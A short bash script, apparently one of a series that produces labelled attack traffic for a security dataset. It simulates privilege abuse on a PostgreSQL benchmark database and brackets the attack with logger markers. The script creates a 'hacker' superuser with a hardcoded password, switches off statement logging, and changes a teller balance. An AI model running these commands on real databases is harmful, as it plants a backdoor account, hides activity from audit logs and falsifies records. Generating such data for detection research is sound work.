#!/bin/bash
echo "Simulating Privilege Abuse (Attack 3 & 4)..."

/dataset_workspace/logger.sh mark_attack "attack_privilege_abuse" start

# Create a hacker role and escalate privileges
psql -U postgres -d casce_tpcb -c "CREATE ROLE hacker WITH SUPERUSER LOGIN PASSWORD 'hacked';"

# Perform unauthorized operations with escalated privileges
export PGPASSWORD='hacked'
psql -U hacker -d casce_tpcb -c "SELECT set_config('log_statement', 'none', false);"
psql -U hacker -d casce_tpcb -c "UPDATE pgbench_tellers SET tbalance = 99999 WHERE tid = 1;"

/dataset_workspace/logger.sh mark_attack "attack_privilege_abuse" end

echo "Privilege abuse attempted."
